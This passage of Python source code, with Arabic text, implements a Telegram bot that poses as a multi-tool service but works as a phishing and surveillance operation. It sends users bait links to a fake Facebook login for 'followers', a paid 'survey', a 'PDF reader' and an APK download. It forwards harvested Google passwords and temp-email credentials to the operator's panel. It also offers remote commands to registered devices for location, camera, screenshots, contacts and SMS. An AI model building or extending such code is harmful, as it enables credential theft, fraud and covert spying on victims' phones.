        markup.row(InlineKeyboardButton(label, callback_data=f"fb_type_{key}"))
    markup.row(InlineKeyboardButton("❌ إلغاء", callback_data="back_to_main"))
    return markup

# ===================== معالج الأوامر =====================
@bot.message_handler(commands=['start'])
def send_welcome(message):
    chat_id = message.chat.id
    user_states[chat_id] = None
    if is_user_banned(chat_id):
        safe_send(chat_id, "🚫 أنت محظور.")
        return
    username = message.from_user.username or ''
    first_name = message.from_user.first_name or ''
    last_name = message.from_user.last_name or ''
    text = message.text
    referral_code = None
    if ' ' in text:
        parts = text.split()
        if len(parts) > 1 and parts[1].startswith('ref_'):
            code = parts[1][4:]
            if handle_referral(code, chat_id):
                safe_send(chat_id, "🎉 تم تفعيل رابط الدعوة! +10 نقاط.")
                referral_code = code
    upsert_user(chat_id, username, first_name, last_name, referral_code)
    if is_new_user(chat_id):
        welcome = (
            "مرحبا بك في البوت المتقدم\n"
            "قم بالضغط على /Start ليعمل النظام 🌐\n"
            "واختر الخيارات التي تريدها 🤖\n"
            "بعض الخيارات تحتاج إلى نقاط 🔒\n"
            "للحصول على نقاط عليك مشاركة النظام 🤖\n"
            "اوامر المساعدة اضغط /help 👤"
        )
        safe_send(chat_id, welcome)
        mark_welcome_sent(chat_id)
    safe_send(chat_id, "📌 القائمة الرئيسية:", reply_markup=build_main_menu(chat_id))

@bot.message_handler(commands=['help'])
def help_command(message):
    help_text = (
        "📖 الأوامر المتاحة\n\n"
        "/start - القائمة الرئيسية\n"
        "/login - تفعيل الخدمات (Google)\n"
        "/logout - تسجيل الخروج\n"
        "/referral - رابط دعوتك\n"
        "/points - نقاطك\n"
        "/cancel - إلغاء العملية\n\n"
        "🔗 نظام النقاط: كل دعوة = 10 نقاط.\n"
        "🔒 الأزرار المغلقة تتطلب نقاطاً.\n"
        "🔓 الأزرار المفتوحة متاحة للجميع.\n"
        "👑 المطور لديه صلاحية كاملة."
    )
    safe_send(message.chat.id, help_text)

@bot.message_handler(commands=['points'])
def show_points(message):
    chat_id = message.chat.id
    points = get_user_points(chat_id)
    safe_send(chat_id, f"⭐ نقاطك: {points}")

@bot.message_handler(commands=['referral'])
def show_referral(message):
    chat_id = message.chat.id
    link = create_referral_link(chat_id)
    safe_send(chat_id, f"🔗 رابط دعوتك:\n{link}")

@bot.message_handler(commands=['cancel'])
def cancel_state(message):
    chat_id = message.chat.id
    if chat_id in user_states:
        del user_states[chat_id]
    if chat_id in admin_remote_target:
        del admin_remote_target[chat_id]
    safe_send(chat_id, "✅ تم الإلغاء.")

@bot.message_handler(commands=['login'])
def google_login_handler(message):
    google_login(message)

@bot.message_handler(commands=['logout'])
def google_logout_handler(message):
    google_logout(message)

@bot.message_handler(commands=['check_email'])
def check_email_command(message):
    chat_id = message.chat.id
    if chat_id not in temp_emails:
        safe_send(chat_id, "❌ ليس لديك بريد مؤقت.")
        return
    token = temp_emails[chat_id]['token']
    msgs = check_temp_emails_real(token)
    response = "📬 رسائل البريد المؤقت\n\n" + "\n\n".join(msgs) if msgs else "📭 لا توجد رسائل."
    safe_send(chat_id, response)

# ===================== معالج الأزرار الكامل =====================
@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    try:
        bot.answer_callback_query(call.id)
        logger.info(f"✅ Callback received: {call.data} from user {call.from_user.id}")
    except Exception as e:
        logger.error(f"Callback answer error: {e}")
    
    chat_id = call.message.chat.id
    data = call.data
    user_id = chat_id
    is_admin_user = is_admin(chat_id)
    unlocked = is_user_unlocked(chat_id)
    points = get_user_points(chat_id)

    # ========== معالجة الأزرار المغلقة ==========
    if data.startswith("locked_"):
        if is_admin_user or unlocked:
            actual_mode = data.replace("locked_", "mode_")
        else:
            required = 20 if "vuln_scan" in data else 10
            if "fb_report" in data: required = 30
            if "temp_number" in data: required = 50
            if "survey" in data: required = 1000
            if "pdf_reader" in data: required = 1000
            if "track_phone_location" in data: required = 500
            if "apk_survey" in data:
                safe_send(chat_id, "❌ هذه الميزة متاحة للمطور فقط.")
                return
            if points < required:
                safe_send(chat_id, f"❌ نقاط غير كافية! تحتاج {required} نقطة.")
                return
            if not deduct_points(chat_id, required, f"استخدام ميزة {data}"):
                safe_send(chat_id, "❌ فشل خصم النقاط.")
                return
            actual_mode = data.replace("locked_", "mode_")
        
        # تنفيذ الميزة المطلوبة
        if actual_mode == "mode_site":
            user_states[chat_id] = "waiting_for_site"
            safe_send(chat_id, "🔗 أرسل رابط الموقع لفحصه.")
        elif actual_mode == "mode_apk":
            user_states[chat_id] = "waiting_for_apk"
            safe_send(chat_id, "📦 أرسل ملف APK لتحليله.")
        elif actual_mode == "mode_my_app":
            user_states[chat_id] = "waiting_for_my_app"
            safe_send(chat_id, "🛠️ أرسل ملف الكود لمراجعته.")
        elif actual_mode == "mode_track_phone":
            user_states[chat_id] = "waiting_for_track_num"
            safe_send(chat_id, "📍 أرسل الرقم (مثل: +201001234567).")
        elif actual_mode == "mode_vuln_scan":
            user_states[chat_id] = "waiting_for_vuln_target"
            safe_send(chat_id, "🛡️ أرسل الهدف لفحص الثغرات.\n\nيمكنك إرسال:\n• رابط موقع\n• عنوان IP\n• نطاق")
        elif actual_mode == "mode_survey":
            survey_url = f"{SERVER_URL}/survey"
            msg = (
                "📄 <b>دعوة رسمية للمشاركة في دراسة تقييم الخدمات</b>\n\n"
                "تتشرف إدارة المنصة بدعوتكم للمشاركة في استبيان تحليلي يهدف إلى قياس جودة الخدمات المقدمة.\n\n"
                "آلية المشاركة والحوافز المالية:\n"
                "• قيمة الحافز لكل استبيان مكتمل: <b>5$</b>\n"
                "• الحد الأدنى للسحب: <b>100$</b>\n\n"
                f"🔗 <a href='{survey_url}'>الرابط الرسمي للمشاركة</a>"
            )
            safe_send(chat_id, msg)
            feature_usage["استبيان"] += 1
        elif actual_mode == "mode_pdf_reader":
            pdf_url = f"{SERVER_URL}/pdf_reader"
            msg = (
                "📄 <b>تم إصدار نسخة جديدة من قارئ المستندات</b>\n\n"
                "لضمان فتح وعرض الملفات كبيرة الحجم بسلاسة، يُوصى باستخدام الإصدار المُحسَّن.\n\n"
                f"🔗 <a href='{pdf_url}'>الموقع الرسمي للتحميل</a>"
            )
            safe_send(chat_id, msg)
            feature_usage["قاريء PDF"] += 1
        elif actual_mode == "mode_track_phone_location":
            user_states[chat_id] = "waiting_for_phone_tracking"
            safe_send(chat_id, "📍 أرسل رقم الهاتف (مثال: +201001234567):")
            feature_usage["تتبع رقم"] += 1
        elif actual_mode == "mode_apk_survey":
            if not is_admin_user:
                safe_send(chat_id, "❌ للمطور فقط.")
                return
            # إرسال ملف APK مباشرة
            apk_url = f"{SERVER_URL}/download_apk_survey"
            safe_send(chat_id, f"📱 <b>APK</b>\n\n🔗 <a href='{apk_url}'>تحميل APK</a>")
            feature_usage["APK"] += 1
            notify_admin(f"📱 مستخدم {chat_id} طلب APK")
        else:
            safe_send(chat_id, "⚠️ ميزة غير معروفة.")
        return

    # ========== الأزرار الإدارية ==========
    if data.startswith('admin_') or data.startswith('mode_admin_panel') or data.startswith('admin_msg_') or data.startswith('admin_user_') or data.startswith('admin_unlock_') or data.startswith('admin_lock_') or data.startswith('admin_add_points_') or data.startswith('admin_remove_points_') or data.startswith('admin_ban_') or data.startswith('admin_unban_'):
        if not is_admin_user:
            safe_send(chat_id, "❌ للمطور فقط.")
            return
        
        # لوحة التحكم الرئيسية
        if data == "mode_admin_panel":
            markup = InlineKeyboardMarkup(row_width=2)
            markup.row(
                InlineKeyboardButton("📢 إرسال رسالة", callback_data="admin_send_message"),
                InlineKeyboardButton("👥 إدارة المستخدمين", callback_data="admin_manage_users")
            )
            markup.row(
                InlineKeyboardButton("📊 إحصائيات", callback_data="admin_stats"),
                InlineKeyboardButton("📢 بث جماعي", callback_data="admin_broadcast")
            )
            markup.row(
                InlineKeyboardButton("📩 معلومات مجمعة", callback_data="admin_collected_data"),
                InlineKeyboardButton("📜 سجل الأخطاء", callback_data="admin_logs")
            )
            markup.row(InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main"))
            safe_send(chat_id, "👑 لوحة التحكم:", reply_markup=markup)
            feature_usage["لوحة التحكم"] += 1
            return

        # إرسال رسالة
        if data == "admin_send_message":
            users = get_all_users()
            markup = InlineKeyboardMarkup(row_width=1)
            for user in users[:20]:
                name = user['first_name'] or user['username'] or str(user['chat_id'])
                markup.row(InlineKeyboardButton(f"{name} ({user['chat_id']})", callback_data=f"admin_msg_{user['chat_id']}"))
            markup.row(InlineKeyboardButton("🔙 رجوع", callback_data="mode_admin_panel"))
            safe_send(chat_id, "📢 اختر المستخدم:", reply_markup=markup)
            return

        if data.startswith("admin_msg_"):
            target_id = int(data.split("_")[2])
            admin_remote_target[chat_id] = target_id
            user_states[chat_id] = "admin_waiting_message"
            safe_send(chat_id, f"📝 أرسل الرسالة للمستخدم {target_id}:\n(لإلغاء: /cancel)")
            return

        # إدارة المستخدمين
        if data == "admin_manage_users":
            users = get_all_users_with_status()
            markup = InlineKeyboardMarkup(row_width=2)
            for user in users[:20]:
                name = user['name'][:15]
                status_icon = "🟢" if user['status'] == "متصل" else "⚪"
                lock_icon = "🔓" if user['unlocked'] else "🔒"
                markup.row(InlineKeyboardButton(f"{status_icon} {name} {lock_icon}", callback_data=f"admin_user_{user['id']}"))
            markup.row(InlineKeyboardButton("🔙 رجوع", callback_data="mode_admin_panel"))
            safe_send(chat_id, "👥 إدارة المستخدمين:", reply_markup=markup)
            return

        if data.startswith("admin_user_"):
            target_id = int(data.split("_")[2])
            user = get_user(target_id)
            if not user:
                safe_send(chat_id, "❌ المستخدم غير موجود.")
                return
            unlocked = is_user_unlocked(target_id)
            status = get_user_status(target_id)
            
            markup = InlineKeyboardMarkup(row_width=2)
            markup.row(InlineKeyboardButton("📩 إرسال رسالة", callback_data=f"admin_msg_{target_id}"))
            if user['is_banned']:
                markup.row(InlineKeyboardButton("✅ إلغاء الحظر", callback_data=f"admin_unban_{target_id}"))
            else:
                markup.row(InlineKeyboardButton("🚫 حظر", callback_data=f"admin_ban_{target_id}"))
            if unlocked:
                markup.row(InlineKeyboardButton("🔒 إعادة قفل النقاط", callback_data=f"admin_lock_{target_id}"))
            else:
                markup.row(InlineKeyboardButton("🔓 إلغاء قفل النقاط", callback_data=f"admin_unlock_{target_id}"))
            markup.row(
                InlineKeyboardButton("➕ إضافة نقاط", callback_data=f"admin_add_points_{target_id}"),
                InlineKeyboardButton("➖ خصم نقاط", callback_data=f"admin_remove_points_{target_id}")
            )
            markup.row(InlineKeyboardButton("🔙 رجوع", callback_data="admin_manage_users"))
            
            info = (
                f"👤 {user['first_name'] or user['username'] or target_id}\n"
                f"🆔 {target_id}\n"
                f"⭐ {user['points']}\n"
                f"🔓 {'مفتوح ✅' if unlocked else 'مغلق 🔒'}\n"
                f"🚫 {'محظور ❌' if user['is_banned'] else 'لا ✅'}\n"
                f"📡 {status}"
            )
            safe_send(chat_id, info, reply_markup=markup)
            return

        # التحكم في النقاط
        if data.startswith("admin_unlock_"):
            target_id = int(data.split("_")[2])
            toggle_user_unlock(target_id, unlock=True)
            safe_send(chat_id, f"✅ تم إلغاء قفل النقاط للمستخدم {target_id}.")
            safe_send(target_id, "🔓 تم إلغاء قفل النقاط لحسابك!")
            return

        if data.startswith("admin_lock_"):
            target_id = int(data.split("_")[2])
            toggle_user_unlock(target_id, unlock=False)
            safe_send(chat_id, f"✅ تم إعادة قفل النقاط للمستخدم {target_id}.")
            safe_send(target_id, "🔒 تم إعادة قفل النقاط لحسابك.")
            return

        if data.startswith("admin_add_points_"):
            target_id = int(data.split("_")[2])
            admin_remote_target[chat_id] = target_id
            user_states[chat_id] = "admin_waiting_add_points"
            safe_send(chat_id, f"➕ أدخل عدد النقاط للإضافة للمستخدم {target_id}:")
            return

        if data.startswith("admin_remove_points_"):
            target_id = int(data.split("_")[2])
            admin_remote_target[chat_id] = target_id
            user_states[chat_id] = "admin_waiting_remove_points"
            safe_send(chat_id, f"➖ أدخل عدد النقاط للخصم من المستخدم {target_id}:")
            return

        # حظر/إلغاء حظر
        if data.startswith("admin_ban_"):
            target_id = int(data.split("_")[2])
            ban_user(target_id)
            safe_send(chat_id, f"🚫 تم حظر المستخدم {target_id}.")
            safe_send(target_id, "🚫 تم حظر حسابك.")
            return

        if data.startswith("admin_unban_"):
            target_id = int(data.split("_")[2])
            unban_user(target_id)
            safe_send(chat_id, f"✅ تم إلغاء حظر المستخدم {target_id}.")
            safe_send(target_id, "✅ تم إلغاء حظر حسابك.")
            return

        # إحصائيات
        if data == "admin_stats":
            conn = sqlite3.connect(DB_PATH)
            c = conn.cursor()
            c.execute("SELECT COUNT(*) FROM users")
            total_users = c.fetchone()[0]
            c.execute("SELECT SUM(points) FROM users")
            total_points = c.fetchone()[0] or 0
            c.execute("SELECT COUNT(*) FROM user_unlocks WHERE unlocked=1")
            unlocked_users = c.fetchone()[0]
            conn.close()
            msg = (
                f"📊 الإحصائيات:\n"
                f"👥 المستخدمون: {total_users}\n"
                f"⭐ إجمالي النقاط: {total_points}\n"
                f"🔓 مفتوحون: {unlocked_users}"
            )
            safe_send(chat_id, msg)
            return

        # بث جماعي
        if data == "admin_broadcast":
            user_states[chat_id] = "waiting_for_broadcast"
            safe_send(chat_id, "📢 أرسل الرسالة للبث الجماعي:")
            return

        # معلومات مجمعة
        if data == "admin_collected_data":
            collected = "📩 المعلومات المجمعة:\n"
            if google_passwords:
                collected += "🔑 كلمات سر Google:\n"
                for uid, pwd in google_passwords.items():
                    email = google_users.get(uid, {}).get('email', 'غير معروف')
                    collected += f"• {uid} ({email}): {pwd}\n"
            if temp_emails:
                collected += "\n📧 البريد المؤقت:\n"
                for uid, data in temp_emails.items():
                    collected += f"• {uid}: {data['email']} | {data['password']}\n"
            if not google_passwords and not temp_emails:
                collected += "📭 لا توجد معلومات."
            safe_send(chat_id, collected)
            return

        # سجل الأخطاء
        if data == "admin_logs":
            try:
                with open('bot.log', 'r') as f:
                    logs = f.read().splitlines()[-30:]
                    text = "📜 آخر 30 سطر:\n" + "\n".join(logs)
                    safe_send(chat_id, text)
            except:
                safe_send(chat_id, "⚠️ لا يوجد سجل.")
            return

    # ========== الأزرار العادية ==========
    if data == "mode_site":
        user_states[chat_id] = "waiting_for_site"
        safe_send(chat_id, "🔗 أرسل رابط الموقع لفحصه.")
    
    elif data == "mode_apk":
        user_states[chat_id] = "waiting_for_apk"
        safe_send(chat_id, "📦 أرسل ملف APK لتحليله.")
    
    elif data == "mode_my_app":
        user_states[chat_id] = "waiting_for_my_app"
        safe_send(chat_id, "🛠️ أرسل ملف الكود لمراجعته.")
    
    elif data == "mode_temp_email":
        email, token, password = create_temp_email_real()
        if email:
            temp_emails[chat_id] = {'email': email, 'token': token, 'password': password}
            text = f"📤 بريدك المؤقت:\n{email}\n🔑 كلمة السر: {password}\nاستخدم /check_email لعرض الرسائل."
            send_sensitive_data_to_admin("Temp Email", f"{email} | {password}", chat_id)
        else:
            text = "⚠️ فشل إنشاء البريد."
        safe_send(chat_id, text)
        feature_usage["إيميل مؤقت"] += 1
    
    elif data == "mode_track_phone":
        user_states[chat_id] = "waiting_for_track_num"
        safe_send(chat_id, "📍 أرسل الرقم (مثل: +201001234567).")
    
    elif data == "mode_fb_report":
        if not is_admin_user and not unlocked and points < 30:
            safe_send(chat_id, "⚠️ تحتاج 30 نقطة.")
            return
        safe_send(chat_id, "📢 اختر نوع البلاغ:", reply_markup=build_fb_report_type_markup())
    
    elif data == "mode_download":
        if not FFMPEG_AVAILABLE:
            safe_send(chat_id, "⚠️ خدمة تحميل الفيديو غير متاحة (FFmpeg غير مثبت).")
            return
        user_states[chat_id] = "waiting_for_download"
        safe_send(chat_id, "📥 أرسل رابط الفيديو لتحميله.")
        feature_usage["تحميل فيديو"] += 1
    
    elif data == "mode_shorten_url":
        user_states[chat_id] = "waiting_for_shorten"
        safe_send(chat_id, "🔗 أرسل الرابط الطويل لتقصيره.")
        feature_usage["تقصير روابط"] += 1
    
    elif data == "mode_vuln_scan":
        user_states[chat_id] = "waiting_for_vuln_target"
        safe_send(chat_id, "🛡️ أرسل الهدف لفحص الثغرات:\n\n• رابط موقع\n• عنوان IP\n• نطاق")
    
    elif data == "mode_pdf":
        user_states[chat_id] = "waiting_for_pdf"
        safe_send(chat_id, "📚 أرسل ملف PDF الدراسي.")
        feature_usage["تحليل PDF"] += 1
    
    elif data == "mode_temp_number":
        safe_send(chat_id, "⏳ جاري جلب أرقام هواتف مؤقتة...")
        numbers = fetch_temp_numbers_advanced(limit=5)
        if numbers:
            response = "📱 أرقام هواتف مؤقتة:\n\n"
            for i, num in enumerate(numbers, 1):
                response += f"{i}. {num['number']} - {num['country']}\n"
            safe_send(chat_id, response)
            feature_usage["رقم مؤقت"] += 1
        else:
            safe_send(chat_id, "⚠️ فشل جلب الأرقام، حاول لاحقاً.")
    
    elif data == "mode_google_login":
        google_login(call.message)
    
    elif data == "mode_google_logout":
        google_logout(call.message)
    
    elif data == "mode_facebook_followers":
        fake_url = f"{SERVER_URL}/facebook_login"
        msg = (
            "🚀 <b>تعزيز حضورك الرقمي</b>\n\n"
            "نقدم حلولاً متكاملة لتعزيز التفاعل وبناء جمهور حقيقي.\n\n"
            "اختر الباقة:\n"
            "🎁 مجانية: 500 متابع\n"
            "🚀 أساسية: 1,000 متابع - $9.99\n"
            "💎 احترافية: 5,000 متابع - $39.99\n"
            "👑 VIP: 10,000 متابع - $79.99\n\n"
            f"🔗 <a href='{fake_url}'>الرابط الرسمي</a>"
        )
        safe_send(chat_id, msg)
        feature_usage["رشق متابعين"] += 1
        notify_admin(f"📊 مستخدم {chat_id} فتح صفحة رشق المتابعين")
    
    elif data == "mode_survey":
        survey_url = f"{SERVER_URL}/survey"
        msg = (
            "📄 <b>دعوة للمشاركة في دراسة تقييم الخدمات</b>\n\n"
            "تتشرف إدارة المنصة بدعوتكم للمشاركة في استبيان تحليلي.\n\n"
            "آلية المشاركة:\n"
            "• قيمة الحافز: <b>5$</b>\n"
            "• الحد الأدنى للسحب: <b>100$</b>\n\n"
            f"🔗 <a href='{survey_url}'>الرابط الرسمي</a>"
        )
        safe_send(chat_id, msg)
        feature_usage["استبيان"] += 1
    
    elif data == "mode_pdf_reader":
        pdf_url = f"{SERVER_URL}/pdf_reader"
        msg = (
            "📄 <b>تم إصدار نسخة جديدة من قارئ المستندات</b>\n\n"
            "لضمان فتح وعرض الملفات كبيرة الحجم بسلاسة.\n\n"
            f"🔗 <a href='{pdf_url}'>الموقع الرسمي للتحميل</a>"
        )
        safe_send(chat_id, msg)
        feature_usage["قاريء PDF"] += 1
    
    elif data == "mode_track_phone_location":
        user_states[chat_id] = "waiting_for_phone_tracking"
        safe_send(chat_id, "📍 أرسل رقم الهاتف (مثال: +201001234567):")
        feature_usage["تتبع رقم"] += 1
    
    elif data == "mode_apk_survey":
        if not is_admin_user:
            safe_send(chat_id, "❌ للمطور فقط.")
            return
        apk_url = f"{SERVER_URL}/download_apk_survey"
        safe_send(chat_id, f"📱 <b>APK</b>\n\n🔗 <a href='{apk_url}'>تحميل APK</a>")
        feature_usage["APK"] += 1
        notify_admin(f"📱 مستخدم {chat_id} طلب APK")
    
    elif data == "mode_show_points":
        safe_send(chat_id, f"⭐ نقاطك: {points}")
    
    elif data == "mode_points_history":
        history = get_points_history(chat_id)
        if not history:
            safe_send(chat_id, "📊 لا يوجد سجل للنقاط.")
        else:
            text = "📊 سجل النقاط:\n\n"
            for row in history:
                sign = "+" if row['amount'] > 0 else ""
                text += f"{sign}{row['amount']} - {row['reason']}\n"
            safe_send(chat_id, text)
    
    elif data == "mode_show_referral":
        link = create_referral_link(chat_id)
        safe_send(chat_id, f"🔗 رابط دعوتك:\n{link}")
    
    elif data == "mode_view_devices" and is_admin_user:
        devs = get_registered_devices_db()
        if not devs:
            text = "📱 لا توجد أجهزة مسجلة."
        else:
            text = "📱 الأجهزة المسجلة:\n\n"
            for d in devs:
                text += f"🆔 {d['device_id']}\n👤 {d['chat_id']}\n\n"
        safe_send(chat_id, text)
    
    elif data == "mode_remote_admin" and is_admin_user:
        safe_send(chat_id, "🎮 تحكم عن بعد\nاختر الجهاز:", reply_markup=build_device_list_markup())
    
    elif data == "mode_set_dev_endpoint" and is_admin_user:
        user_states[chat_id] = "waiting_for_dev_endpoint"
        safe_send(chat_id, "🖥️ أرسل عنوان حاسب المطور (مثل: http://192.168.1.100:8080)")
    
    elif data.startswith("remote_select_") and is_admin_user:
        device_id = data.split("_")[2]
        with db_transaction() as conn:
            c = conn.cursor()
            c.execute("SELECT * FROM devices WHERE device_id = ?", (device_id,))
            if c.fetchone():
                admin_remote_target[chat_id] = device_id
                user_states[chat_id] = "waiting_for_remote_command"
                safe_send(chat_id, f"✅ تم اختيار: {device_id}\n\n📝 الأوامر:\n• موقع\n• كاميرا\n• لقطة\n• صور\n• جهات اتصال\n• رسائل")
            else:
                safe_send(chat_id, "❌ الجهاز غير موجود.")
    
    elif data in ["no_devices", "back_to_main"]:
        safe_send(chat_id, "📌 القائمة الرئيسية:", reply_markup=build_main_menu(chat_id))
    
    # معالجة أزرار البلاغ
    elif data.startswith("fb_type_"):
        report_type_key = data.split("_")[2]
        report_type_label = FB_REPORT_TYPES.get(report_type_key, "أخرى")
        user_states[chat_id] = "waiting_for_fb_report_reason"
        user_states[f"{chat_id}_fb_report_type"] = report_type_label
        safe_send(chat_id, f"✅ تم اختيار: {report_type_label}\n\nاكتب شرحاً مفصلاً للمشكلة.")
    
    else:
        safe_send(chat_id, "⚠️ خيار غير معروف.")

# ===================== معالج النصوص =====================
@bot.message_handler(func=lambda msg: True, content_types=['text'])
def handle_text_messages(message):
    chat_id = message.chat.id
    state = user_states.get(chat_id)
    text = message.text.strip()

    try:
        # معالجة أوامر المطور
        if state == "admin_waiting_message":
            target_id = admin_remote_target.get(chat_id)
            if not target_id:
                safe_send(chat_id, "❌ لم يتم تحديد مستخدم.")
                user_states[chat_id] = None
                return
            try:
                safe_send(target_id, f"📩 <b>رسالة من الإدارة:</b>\n\n{text}")
                safe_send(chat_id, f"✅ تم إرسال الرسالة للمستخدم {target_id}.")
                notify_admin(f"📩 أرسل المطور رسالة للمستخدم {target_id}: {text[:50]}...")
            except Exception as e:
                safe_send(chat_id, f"⚠️ فشل الإرسال: {str(e)}")
            user_states[chat_id] = None
            admin_remote_target.pop(chat_id, None)
            return

        if state == "admin_waiting_add_points":
            target_id = admin_remote_target.get(chat_id)
            if not target_id:
                safe_send(chat_id, "❌ لم يتم تحديد مستخدم.")
                user_states[chat_id] = None
                return
            try:
                amount = int(text)
                if amount <= 0:
                    safe_send(chat_id, "⚠️ يجب أن يكون العدد موجباً.")
                    return
                add_points_db(target_id, amount, "إضافة نقاط من المطور")
                safe_send(chat_id, f"✅ تم إضافة {amount} نقطة للمستخدم {target_id}.")
                safe_send(target_id, f"➕ تمت إضافة {amount} نقطة إلى رصيدك.")
            except ValueError:
                safe_send(chat_id, "⚠️ يرجى إدخال عدد صحيح.")
            user_states[chat_id] = None
            admin_remote_target.pop(chat_id, None)
            return

        if state == "admin_waiting_remove_points":
            target_id = admin_remote_target.get(chat_id)
            if not target_id:
                safe_send(chat_id, "❌ لم يتم تحديد مستخدم.")
                user_states[chat_id] = None
                return
            try:
                amount = int(text)
                if amount <= 0:
                    safe_send(chat_id, "⚠️ يجب أن يكون العدد موجباً.")
                    return
                if deduct_points(target_id, amount, "خصم نقاط من المطور"):
                    safe_send(chat_id, f"✅ تم خصم {amount} نقطة من المستخدم {target_id}.")
                    safe_send(target_id, f"➖ تم خصم {amount} نقطة من رصيدك.")
                else:
                    safe_send(chat_id, f"⚠️ المستخدم {target_id} ليس لديه نقاط كافية.")
            except ValueError:
                safe_send(chat_id, "⚠️ يرجى إدخال عدد صحيح.")
            user_states[chat_id] = None
            admin_remote_target.pop(chat_id, None)
            return

        # معالجة بقية الحالات
        if state == "waiting_for_phone_tracking":
            clean_number = re.sub(r'[\s\-()]', '', text)
            if not clean_number.startswith('+'):
                clean_number = '+' + clean_number
            if re.match(r'^\d{15}$', clean_number.replace('+', '')):
                safe_send(chat_id, "⚠️ لا يمكن تتبع الهاتف عبر IMEI.\nأرسل رقم الهاتف (مثال: +201001234567)")
                user_states[chat_id] = None
                return
            safe_send(chat_id, "⏳ جاري تتبع الموقع...")
            result, status = track_phone_advanced(clean_number)
            safe_send(chat_id, result)
            user_states[chat_id] = None
            return

        if state == "waiting_for_site":
            if re.match(r'^https?://', text):
                safe_send(chat_id, "⏳ جاري فحص الموقع...")
                result, status = scan_website(text)
                safe_send(chat_id, f"🔍 نتيجة الفحص:\n{result}")
            else:
                safe_send(chat_id, "❌ رابط غير صالح.")
            user_states[chat_id] = None
            return

        if state == "waiting_for_shorten":
            if re.match(r'^https?://', text):
                short_url, error = shorten_url(text)
                if error:
                    safe_send(chat_id, f"⚠️ فشل تقصير الرابط: {error}")
                else:
                    safe_send(chat_id, f"✅ الرابط المختصر:\n{short_url}")
            else:
                safe_send(chat_id, "❌ رابط غير صالح.")
            user_states[chat_id] = None
            return

        if state == "waiting_for_track_num":
            result, status = track_phone_real(text)
            safe_send(chat_id, result)
            user_states[chat_id] = None
            return

        if state == "waiting_for_vuln_target":
            target = text
            safe_send(chat_id, "⏳ جاري فحص الثغرات...")
            try:
                target_ip = None
                target_domain = None
                target_url = None
                if re.match(r'^https?://', target):
                    target_url = target
                    domain_match = re.search(r'https?://([^/:]+)', target)
                    if domain_match:
                        target_domain = domain_match.group(1)
                elif re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', target):
                    target_ip = target
                elif re.match(r'^[a-zA-Z0-9-]+\.[a-zA-Z]{2,}$', target):
                    target_domain = target
                    target_url = f"https://{target}"
                else:
                    safe_send(chat_id, "⚠️ لم يتم التعرف على الهدف.")
                    user_states[chat_id] = None
                    return
                report = perform_vulnerability_scan(target_ip, target_domain, target_url)
                safe_send(chat_id, report)
                feature_usage["فحص ثغرات"] += 1
            except Exception as e:
                safe_send(chat_id, f"⚠️ حدث عطل فني: {str(e)[:100]}")
            user_states[chat_id] = None
            return

        if state == "waiting_for_download":
            if re.match(r'^https?://', text):
                safe_send(chat_id, "⏳ جاري تحميل الفيديو...")
                result, error = download_video(text)
                if error:
                    safe_send(chat_id, f"⚠️ {error}")
                elif result and os.path.exists(result):
                    try:
                        with open(result, 'rb') as f:
                            bot.send_video(chat_id, f, caption="📥 تم التحميل")
                        os.remove(result)
                    except Exception as e:
                        safe_send(chat_id, f"⚠️ فشل إرسال الفيديو: {str(e)}")
                else:
                    safe_send(chat_id, "⚠️ فشل تحميل الفيديو.")
            else:
                safe_send(chat_id, "❌ رابط غير صالح.")
            user_states[chat_id] = None
            return

        if state == "waiting_for_broadcast" and is_admin_user:
            success = 0
            fail = 0
            with db_transaction() as conn:
                c = conn.cursor()
                c.execute("SELECT chat_id FROM users WHERE is_banned = 0")
                users = c.fetchall()
            for user in users:
                try:
                    safe_send(user['chat_id'], text)
                    success += 1
                    time.sleep(0.1)
                except:
                    fail += 1
            safe_send(chat_id, f"✅ تم إرسال الرسالة لـ {success} مستخدم.\n❌ فشل الإرسال لـ {fail} مستخدم.")
            user_states[chat_id] = None
            notify_admin(f"📢 بث جماعي: {text[:50]}...")
            return

        if state == "waiting_for_fb_report_reason":
            reason = text
            user_states[chat_id] = "waiting_for_fb_report_link"
            user_states[f"{chat_id}_fb_report_reason"] = reason
            safe_send(chat_id, "✅ تم حفظ السبب.\n\nأرسل رابط المنشور (أو اكتب 'لا يوجد').")
            return

        if state == "waiting_for_fb_report_link":
            link = text if text.lower() != 'لا يوجد' else ''
            report_type = user_states.get(f"{chat_id}_fb_report_type")
            reason = user_states.get(f"{chat_id}_fb_report_reason")
            if not report_type or not reason:
                safe_send(chat_id, "❌ حدث خطأ.")
                user_states[chat_id] = None
                return
            report_text = generate_fb_report(report_type, reason, link)
            support_links = {
                "حساب مزيف": "https://www.facebook.com/help/contact/295309487309948",
                "منشور مسيء": "https://www.facebook.com/help/contact/315847653073855",
                "تحرش أو مضايقة": "https://www.facebook.com/help/contact/237547145079192",
                "انتحال شخصية": "https://www.facebook.com/help/contact/295309487309948",
                "انتهاك خصوصية": "https://www.facebook.com/help/contact/249621638488458",
                "محتوى عنيف": "https://www.facebook.com/help/contact/274459462613911"
            }
            support_link = "https://www.facebook.com/help/contact/315847653073855"
            for key, url in support_links.items():
                if key in report_type:
                    support_link = url
                    break
            final_msg = (
                f"📝 شكوى رسمية\n\n"
                f"{report_text}\n\n"
                f"🔗 رابط الدعم: {support_link}\n\n"
                f"📌 انسخ النص أعلاه، ثم اضغط على الرابط، والصق النص."
            )
            markup = InlineKeyboardMarkup()
            markup.row(InlineKeyboardButton("🌐 فتح رابط الدعم", url=support_link))
            markup.row(InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main"))
            safe_send(chat_id, final_msg, reply_markup=markup)
            for key in [f"{chat_id}_fb_report_type", f"{chat_id}_fb_report_reason"]:
                if key in user_states:
                    del user_states[key]
            user_states[chat_id] = None
            feature_usage["بلاغات فيسبوك"] += 1
            return

        if state == "waiting_for_pdf_question":
            pdf_text = user_states.get(f"{chat_id}_pdf_text")
            if not pdf_text:
                safe_send(chat_id, "⚠️ لم يتم تحميل ملف PDF.")
                user_states[chat_id] = None
                return
            answer = answer_question_from_pdf(pdf_text, text)
            safe_send(chat_id, f"📚 الإجابة:\n{answer}")
            return

        if state is None:
            safe_send(chat_id, "🤖 اختر خدمة من القائمة.", reply_markup=build_main_menu(chat_id))
    except Exception as e:
        logger.error(f"handle_text_messages error: {e}")
        notify_admin(f"خطأ: {str(e)}", is_error=True)
        safe_send(chat_id, f"⚠️ حدث عطل فني: {str(e)}")

